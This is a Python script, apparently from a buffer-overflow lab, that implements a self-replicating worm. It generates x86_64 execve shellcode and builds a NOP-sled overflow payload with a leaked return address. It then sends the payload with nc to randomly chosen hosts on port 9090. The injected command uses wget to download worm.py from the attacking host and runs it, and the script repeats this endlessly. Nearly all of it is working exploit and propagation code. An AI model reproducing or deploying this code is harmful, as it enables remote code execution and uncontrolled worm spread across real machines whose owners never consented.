#!/usr/bin/env python3
import os
import subprocess
from random import randint
import socket

def create_hex_command(command = b"echo 'true' > infectado.txt"):
    comando_alinhado = command + b"\x00"
    while len(comando_alinhado) % 8 != 0:
        comando_alinhado += b"\x00"
    # Constrói o shellcode dinamicamente invertendo o comando para o PUSH (Stack cresce para baixo)
    shellcode_dinamico = b""

    # 1. Empilha o comando em blocos de 8 bytes (x86_64)
    for i in range(len(comando_alinhado) - 8, -1, -8):
        bloco = comando_alinhado[i:i+8]
        shellcode_dinamico += b"\x48\xb8" + bloco  # mov rax, bloco_de_8_bytes
        shellcode_dinamico += b"\x50"              # push rax

    shellcode_dinamico += b"\x48\x89\xe2"          # mov rdx, rsp (rdx aponta para o comando)

    # 2. Empilha a flag "-c"
    shellcode_dinamico += (
        b"\x48\xb8\x2d\x63\x00\x00\x00\x00\x00\x00"  # mov rax, 0x632d ("-c\x00...")
        b"\x50"                                      # push rax
        b"\x48\x89\xe6"                              # mov rsi, rsp (rsi aponta para "-c")
    )

    # 3. Empilha o executável "/bin/sh"
    shellcode_dinamico += (
        b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00"  # mov rax, 0x0068732f6e69622f ("/bin/sh\x00")
        b"\x50"                                      # push rax
        b"\x48\x89\xe7"                              # mov rdi, rsp (rdi aponta para "/bin/sh")
    )

    # 4. Constrói o array argv na pilha [ /bin/sh, -c, comando, NULL ]
    shellcode_dinamico += (
        b"\x48\x31\xc0"  # xor rax, rax
        b"\x50"          # push rax (NULL terminator do array)
        b"\x52"          # push rdx (ponteiro para o comando)
        b"\x56"          # push rsi (ponteiro para "-c")
        b"\x57"          # push rdi (ponteiro para "/bin/sh")
        b"\x48\x89\xe6"  # mov rsi, rsp (rsi agora é o argv[])
        b"\x48\x31\xd2"  # xor rdx, rdx (envp = NULL)
        b"\xb0\x3b"      # mov al, 59 (syscall execve)
        b"\x0f\x05"      # syscall
    )
    print(f"Shellcode pronto ({len(shellcode_dinamico)} bytes):")
    print(shellcode_dinamico)
    return shellcode_dinamico

def getNextTarget():
    """Gera uma lista com todos os possíveis IPs dentro das sub-redes (172.28.1.10 a 172.28.5.14) e escolhe um aleatoriamente."""
    
    ips = []

    for subnet in range(1, 6):
        for host in range(10, 15):
            ips.append(f"172.28.{subnet}.{host}")
    
    return ips[randint(0, len(ips) - 1)]

def getBadfile(ret_code, malicious_code):
    """
        Task 1: O Ataque de Buffer Overflow
        Construa a sua carga maliciosa (payload) aqui.
    """
    # Preenche o buffer com instruções NOP (0x90) -> pula pra próxima operação
    content = bytearray(0x90 for i in range(500))

    start = 500 - len(malicious_code)
    content[start:] = malicious_code

    ret = ret_code + 0x100
    offset = 72
    L = 8
    content[offset:offset + L] = (ret).to_bytes(L, byteorder="little")

    return content

def inject(badfile, targetIP):
    with open("badfile", "wb") as f:
        f.write(badfile)

    print(f"Lançando ataque contra {targetIP} na porta 9090...")

    subprocess.run(
        f"cat badfile | nc -w3 {targetIP} 9090",
        shell=True,
        timeout=5
    )

def main():
    print("O worm chegou neste host! ^_^")
    
    targetIP = getNextTarget()
    print(f"Alvo selecionado: {targetIP}")

    print(f"Capturando endereço de memória de {targetIP}...")
    resultado_leak = subprocess.check_output(f"echo | nc {targetIP} 9090", shell=True).decode()
    partes = resultado_leak.split("0x")
    if len(partes) < 2:
        print("Erro: Não foi possível capturar o endereço de memória.")
        return
    addr_str = partes[1].split()[0]
    leak_ret = int(addr_str, 16)

    meu_ip = socket.gethostbyname(socket.gethostname())
    
    servidor = subprocess.Popen(["python3", "-m", "http.server", "8080"], 
                                stdout=subprocess.DEVNULL, 
                                stderr=subprocess.DEVNULL)
    
    comando = f"echo 'true' > infectado.txt && wget http://{meu_ip}:8080/worm.py && chmod +x worm.py && ./worm.py &"
    
    shellcode = create_hex_command(comando.encode())
    badfile = getBadfile(leak_ret, shellcode) 

    inject(badfile, targetIP)

    servidor.terminate()
    
    print("Ataque concluído com sucesso! :D")
    exit()

if __name__ == "__main__":
    while True:
        main()